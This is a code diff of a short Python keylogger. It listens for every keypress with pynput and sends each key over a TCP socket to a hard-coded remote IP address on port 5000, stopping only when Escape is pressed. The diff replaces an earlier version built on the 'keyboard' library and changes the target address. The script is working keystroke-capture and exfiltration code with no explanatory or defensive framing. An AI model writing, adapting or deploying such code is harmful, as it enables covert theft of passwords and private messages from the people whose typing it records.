@@ -1,20 +1,21 @@
-import socket, keyboard
+import socket
+from pynput.keyboard import Key, Listener
 
-host = "192.168.188.2"
+host = "169.254.139.218"
 port = 5000
 
 client = socket.socket()
 client.connect((host, port))
 
-while True:
-    key = keyboard.read_key() 
-    if (keyboard.is_pressed('x')):
-        break
-    encoded = key.encode()
-    client.send(encoded)
-    #data = client.recv(1024).decode()
+
+def on_press(key):
+    if key == Key.esc:
+        return False
+    client.send("{0}".format(key).encode())
 
 
-    #print('Received from server: ' + data)
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
 
 client.close()
